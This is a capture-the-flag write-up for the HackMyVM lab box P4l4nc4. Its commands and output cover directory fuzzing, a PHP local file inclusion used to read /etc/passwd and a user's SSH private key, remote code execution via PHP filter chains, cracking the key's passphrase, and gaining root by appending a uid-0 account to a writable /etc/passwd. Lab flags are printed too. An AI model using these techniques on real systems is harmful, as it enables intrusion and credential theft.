# P4l4cn4

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.67:22
Open 10.0.2.67:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.67

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOivOsrUzyDrcDiLiy1FtWvhJBrwgvn3bHTLqEYsTJpX0asFo9Y92BP1YLmIw15W7xvPUomdb2pLkZE7eA7UHEQ=
|   256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFv7TMFGm6Kpck+FyLN0+YjCYta5UaHEUj9s8cPbNHBt
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/p4l4nc4/writeup.png)

```bash
└─$ feroxbuster -u http://palance.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 276
200      GET      368l      933w    10701c http://palance.hmv/index.html
200      GET      368l      933w    10701c http://palance.hmv/
200      GET        2l      205w     1432c http://palance.hmv/robots.txt
```

Hm?
```bash
└─$ curl http://palance.hmv/robots.txt -s | trans -b :en
The black palate is a subspentity of palanca-black. Of all subspecies, it stands out for its large size, one of the most rare African ungulates. This subspentity is the end of Angola, only in two places, the Cangandala National Park and the Moonlight Integral Nature Reserve. In 2002, the Angolan Civil War was known little about the survival of Mother Little Espão in Angola and, in fact, it was afraid that the Giant Black Palanca had disappeared. In January 2004, a group of the Center for Scientific Studies and Investigation of the Cathalic University of Angola, led by Dr. Pedro Vaz Pinto, obtained the first photographic evidence of the flock that was remaining in the Cangandala National Park, south of Malanje, thus confirming the persistence of the population. War period.
Currently, the Giant Black Palanca is considered as the National Samboo de Angola, being proud of the Angolan people. As proof of this, the Angolan football selection is called Palancas-Negras and Angolan, Taag, has this anthalope as a samble. Palanca is also the name of one of the subdivisions of the city of Luanda, capital of Angola. In African mythology, as well as other anthalopes, they symbolize liveliness, speed, beauty and visual sharpness
```

### Fuzzing

```bash
└─$ cewl http://palance.hmv/robots.txt -w wordlist.txt --lowercase --with-numbers --convert-umlauts --meta
└─$ feroxbuster -u http://palance.hmv/ -w wordlist.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 276
# Nothing
```

Considering the box name we might need to try leet version of words?
```bash
└─$ alias leet='sed -e "s/a/4/g" -e "s/e/3/g" -e "s/i/1/g" -e "s/o/0/g" -e "s/t/7/g" -e "s/s/5/g" -e "s/l/1/g"'
└─$ cat wordlist.txt | leet > w0rd1157.txt
└─$ feroxbuster -u http://palance.hmv/ -w w0rd1157.txt --thorough -D --dont-scan css,png,jpeg,jpg,gif -x .php -S 276,273
301      GET        9l       28w      310c http://palance.hmv/n3gr4 => http://palance.hmv/n3gr4/
200      GET      368l      933w    10701c http://palance.hmv/
500      GET        0l        0w        0c http://palance.hmv/n3gr4/m414nj3.php
```

```bash
└─$ ffuf -u 'http://palance.hmv/n3gr4/m414nj3.php?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 500
page                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
```

### LFI

```bash
└─$ curl 'http://palance.hmv/n3gr4/m414nj3.php?page=/etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
```

Read source
```bash
└─$ curl -s 'http://palance.hmv/n3gr4/m414nj3.php?page=php://filter/convert.base64-encode/resource=file:///var/www/html/n3gr4/m414nj3.php' | base64 -d
<?php
    $page = $_GET['page'];
    include($page);
?>
```

We can read user's SSH key
```bash
└─$ curl 'http://palance.hmv/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa' -s | tee id_rsa.p4l4nc4
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
nTg0N8MP9vp0O2B9vrwHLz9JekTblv93/VCDpJS78CGkNNOVMRcv2ZB3w7uFm6zxRZxQmH
5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
l1HXVrZY1biDOrpJQ7O+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
jytzseFr83bPyOyGSze51kJX4r2ljurDvmcnXfQ4j27zUUmwEKi02VvjLngXbmMnIMDLI3
x/pdFxnyZ0w6wnl/Bg+2gvc54Y2ssMblNMw6HZU4K2TN/c3li3A3hLZsN7QwNIV76X5UeP
dWCOngRsImAmMtyxPKZ0rvYwgDimWunQPy0yJXEPdofL6hrAxFZ6y+jnm+gM7x1fnooSkb
9H5RblfwiOtuTD7bmAu6ApNU0Ul3X2YFPnDLFjo/D0Sj5LcsYDQ+XlTNUwnjHpyMy5VzUz
2vDpiscBd7FpFCHf1lS9bfGMLbhOfdM6TPzpjlOmdRizoVjGCZdXsA4Jg05FpvEFa3KHqM
iJOA9yXhHPROYmOwl5Mu+NTPc+Xbiu7B8TJu/BORoOShhbm7+kQpXM7XHPDKTTnJo+qmsI
Pt9FuQF3wZWIXZ48DmRKJKhB+a9LwuE8ES3wUTVqx/EbAs08V6/uiBYZmorJFSgbPd68AE
xKTK9ObilJKSfS2Ik5/iVIBTUxlAt2foAUpWTlXVNmFfBEhRSk48E8NhcgNqctKWpjKf0R
2gi/Dvpect4LoqKPue5zvN0dNlYSiq/6QK6NqJrJdN7DvsvocL+BcWmmv31erlJOo6A3Zw
CEpmnqVzMTroZSBQv3eEsOFS/+RkJ5ffFRpXGfWPh4Dn/Y++n3wbHNNb97pOd9WV+IlhDV
7btvga8cG9xp3zihOIf308VowcpIp0CSlEqZDBpis5jWY9J3N1+uh3pJHFgqmLxKnqLmzu
u15Kh/+nAV6DTBVxrdhq8HoLAvb7ubAq2ICHALC39X12+J0cLOUMi8UWYawMTFgYnO3ZBD
fb6fZaM9Hr97jREiUEG6vgIcNgn6jtJ3EM3ncxTKe2T8SSYn8pFy9Lqf+lvZ8yo9DkaPl5
ORSVWa+jCKhuClPZY5t8VJC9xXGyz8Wah15Y2pg95nGEub7dgmRlQAIiSxjWsDmaDzIBPo
IkZ5lzxoTvvtL2N1+4ZFprPwUN6y6C6zrXbzQp7Ov0bZc2g9fFiNxu1HvR96rwVNFHbeia
OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
muaZDiXw==
-----END OPENSSH PRIVATE KEY-----
```

## RCE

Using [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) you can achieve RCE via PHP filters.

```bash
└─$ py php_filter_chain_generator.py --chain '<?php system("id");?>' | tail -1 > payload.txt
└─$ curl "http://palance.hmv/n3gr4/m414nj3.php?page=$(cat payload.txt)" -o-
uid=33(www-data) gid=33(www-data) groups=33(www-data)
@C>==@C>==@C>==@C>==@C>==@C>==@C>==@ 
```

## SSH

Still requires password
```bash
└─$ chmod 600 id_rsa.p4l4nc4
└─$ ssh -i id_rsa.p4l4nc4 p4l4nc4@palance.hmv
p4l4nc4@palance.hmv's password:
```

```bash
└─$ ssh2john id_rsa.p4l4nc4 | tee id_rsa.p4l4nc4.hash
id_rsa.p4l4nc4:$sshng$6$16$af4d19cd962d872dcef0601f52d666c2$1318$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010af4d19cd962d872dcef0601f52d666c2000000100000000100000117000000077373682d727361000000030100010000010100ab5d9f7c0d832b9ff7fbe3f83cda5a8390c1e4ca87171979fc55a3ff37bbc3f63e662d2af5ba128605bc5c566e2e18ff64fff9a644a95ec1197f3199d383437c30ff6fa743b607dbebc072f3f497a44db96ff77fd5083a494bbf021a434d39531172fd99077c3bb859bacf1459c50987e4769136e7fbf791904858f26e2aa637b32eefc6c6ffde1a40c6592c02d89a8c8c0985971afbc7a7144dd5dc0db13ec87f868d0449751d756b658d5b8833aba4943b3be799a43e082ace7f42028beb0f6705ccd57062a4bf29acf7c039a936bf178dfed42c501369e0c0f89e8c911e259d0f12442ede76532b593b5a9273567869a9b1c69702966dfbcc2a1dbb636829000003c08e8dafebcba1768427248846b563218173fc2dc1d7ba66a71fa59aea457d4eabb951cb13dda0c1ecabf7001de65c61297d48e810a58651280d69331010931ffe33836b63f38fa1ce1755594cba29a0956d16eebc961640d598e2481f93fdc54e748914777e93c0992263775daffd0d154b9a08f2b73b1e16bf376cfc8ec864b37b9d64257e2bda58eeac3be67275df4388f6ef35149b010a8b4d95be32e78176e632720c0cb237c7fa5d1719f2674c3ac2797f060fb682f739e18dacb0c6e534cc3a1d95382b64cdfdcde58b703784b66c37b43034857be97e5478f75608e9e046c22602632dcb13ca674aef6308038a65ae9d03f2d3225710f7687cbea1ac0c4567acbe8e79be80cef1d5f9e8a1291bf47e516e57f088eb6e4c3edb980bba029354d149775f66053e70cb163a3f0f44a3e4b72c60343e5e54cd5309e31e9c8ccb9573533daf0e98ac70177b1691421dfd654bd6df18c2db84e7dd33a4cfce98e53a67518b3a158c6099757b00e09834e45a6f1056b7287a8c889380f725e11cf44e6263b097932ef8d4cf73e5db8aeec1f1326efc1391a0e4a185b9bbfa44295cced71cf0ca4d39c9a3eaa6b083edf45b90177c195885d9e3c0e644a24a841f9af4bc2e13c112df051356ac7f11b02cd3c57afee8816199a8ac915281b3ddebc004c4a4caf4e6e29492927d2d88939fe2548053531940b767e8014a564e55d536615f0448514a4e3c13c36172036a72d296a6329fd11da08bf0efa5e72de0ba2a28fb9ee73bcdd1d3656128aaffa40ae8da89ac974dec3becbe870bf817169a6bf7d5eae524ea3a037670084a669ea573313ae8652050bf7784b0e152ffe4642797df151a5719f58f8780e7fd8fbe9f7c1b1cd35bf7ba4e77d595f889610d5edbb6f81af1c1bdc69df38a13887f7d3c568c1ca48a74092944a990c1a62b398d663d277375fae877a491c582a98bc4a9ea2e6ceebb5e4a87ffa7015e834c1571add86af07a0b02f6fbb9b02ad8808700b0b7f57d76f89d1c2ce50c8bc51661ac0c4c58189cedd90437dbe9f65a33d1ebf7b8d11225041babe021c3609fa8ed27710cde77314ca7b64fc492627f29172f4ba9ffa5bd9f32a3d0e468f97939149559afa308a86e0a53d9639b7c5490bdc571b2cfc59a875e58da983de67184b9bedd8264654002224b18d6b0399a0f32013e8224679973c684efbed2f6375fb8645a6b3f050deb2e82eb3ad76f3429ecebf46d973683d7c588dc6ed47bd1f7aaf054d1476de89a38910cd8d652514e763c4c6062d497c0ee5a0f2ef4a0a8aed296e27e860e9b5f61958c1858e39aeacfa85b6146f9a5cef1621e11a9ae6990e25f$16$358

└─$ john id_rsa.p4l4nc4.hash --wordlist=$rockyou
friendster       (id_rsa.p4l4nc4)
```

```bash
└─$ sshpass -p 'friendster' ssh p4l4nc4@palance.hmv
p4l4nc4@4ng014:~$ id
uid=1000(p4l4nc4) gid=1000(p4l4nc4) groups=1000(p4l4nc4),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```
p4l4nc4@4ng014:~$ cat user.txt
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
```

## Privilege Escalation

`.bash_history` is readable and while going over it it contains suspicious lines
```bash
p4l4nc4@4ng014:~$ nl ~/.bash_history | grep passwd
   104  ls /etc/passwd
   105  ls -l /etc/passwd
   106  sudo chmod rw-rw-rw- /etc/passwd
   107  sudo chmod rwrwrw /etc/passwd
   108  sudo chmod 666 /etc/passwd
   109  ls -l /etc/passwd
```

The `passwd` is writable..
```bash
p4l4nc4@4ng014:~$ ls -lh /etc/passwd
-rw-rw-rw- 1 root root 1.1K Nov 13  2024 /etc/passwd
```

```bash
p4l4nc4@4ng014:~$ echo "pwn:$(openssl passwd -6 -salt x y):0:0:root:/root:/bin/bash" >> /etc/passwd
p4l4nc4@4ng014:~$ su - pwn
Password: y
root@4ng014:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@4ng014:~# cat /root/root.txt
HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
```